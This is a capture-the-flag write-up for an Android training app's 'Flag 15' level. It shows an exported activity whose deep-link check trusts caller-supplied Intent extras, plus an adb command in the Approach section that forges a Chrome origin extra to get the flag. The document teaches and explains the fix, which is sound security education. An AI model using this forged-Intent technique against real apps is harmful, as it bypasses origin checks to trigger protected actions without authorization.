# Flag 15 — Skipping the Browser Entirely for an `intent://` Link

**Vulnerability category:** Deep link / App Link trust bypass
**Target component:** `io.hextree.attacksurface.activities.Flag15Activity` (exported)

---

## Target

Same family of bug as [flag 13](../flag-13), with one more twist. `Flag15Activity` is meant to be reached via an `intent://` URI — a Chrome-specific link syntax that lets a web page encode an arbitrary `Intent` (action, categories, extras) inside a link, which Chrome parses and fires as a real Android `Intent` when the user taps it. The activity checks it was reached that way with the same kind of heuristic as flag 13:

```java
private boolean isDeeplink(Intent intent) {
    return (intent == null
            || intent.getAction() == null
            || !intent.getCategories().contains("android.intent.category.BROWSABLE")
            || intent.getStringExtra("com.android.browser.application_id") == null)
        ? false : true;
}

protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    Intent intent = getIntent();
    if (intent == null) return;

    String action = intent.getAction();
    if (action == null) {
        // falls back to opening a web page that would build the real intent:// link
        return;
    }

    if (isDeeplink(intent) && action.equals("io.hextree.action.GIVE_FLAG")) {
        Bundle extras = intent.getExtras();
        if (extras == null) { finish(); }
        String string = extras.getString("action", "open");
        if (extras.getBoolean("flag", false) && string.equals("flag")) {
            success(this);
        } else if (string.equals("open")) {
            Toast.makeText(this, "Website: " + extras.getString("message", "open"), 1).show();
        }
    }
}
```

The flag is released when all of this is true at once: `action == "io.hextree.action.GIVE_FLAG"`, category `BROWSABLE` is present, the `com.android.browser.application_id` extra is non-null, and two of the activity's own extras are set correctly: `flag` (boolean) `== true` and `action` (string) `== "flag"`.

## Vulnerability

Exactly the same problem as flag 13: every one of these checks is just data on an `Intent`, and `Flag15Activity` is exported, so nothing stops a caller from constructing that exact `Intent` directly — action, category, and every extra — without ever touching a browser, an `intent://` link, or Chrome's link-parsing logic. The activity never verifies the real calling package or goes through any OS-enforced link verification; it only inspects values the caller freely supplies.

## Approach

Build the equivalent `Intent` directly with `adb`, addressing the component explicitly instead of going through a link at all:

```bash
adb shell am start \
  -a io.hextree.action.GIVE_FLAG \
  -c android.intent.category.BROWSABLE \
  -n io.hextree.attacksurface/.activities.Flag15Activity \
  --es action flag \
  --ez flag true \
  --es com.android.browser.application_id com.android.chrome
```

- `-a io.hextree.action.GIVE_FLAG` — the custom action the activity checks for.
- `-c android.intent.category.BROWSABLE` — satisfies `isDeeplink()`'s category check.
- `-n io.hextree.attacksurface/.activities.Flag15Activity` — targets the component explicitly, skipping link resolution/the browser entirely.
- `--es action flag` / `--ez flag true` — the two extras the success branch requires (`extras.getString("action") == "flag"` and `extras.getBoolean("flag") == true`).
- `--es com.android.browser.application_id com.android.chrome` — forges the "sent by Chrome" signal.

## Why it works

The intended flow (web page → `intent://` link → Chrome → real Android `Intent`) is just one way to produce an `Intent` with these exact properties — but Android has no mechanism tying that `Intent`'s content to having actually passed through a browser. An exported activity is reachable by any caller who can replicate the right action/category/extras, `adb` included, and `isDeeplink()`'s checks don't distinguish between a browser-originated intent and a hand-built one.

## Fix

Same guidance as [flag 13](../flag-13/README.md#fix): don't treat action/category/extra values as proof of origin — they're attacker-suppliable on any exported component. If the goal is genuinely "only accept this from a real browser interaction," there is no reliable way to enforce that purely from `Intent` contents; the sensitive action needs to be gated by something the caller can't fabricate (real user confirmation inside the app, a server-verified token, a signature-level permission scoped to a trusted browser/package).
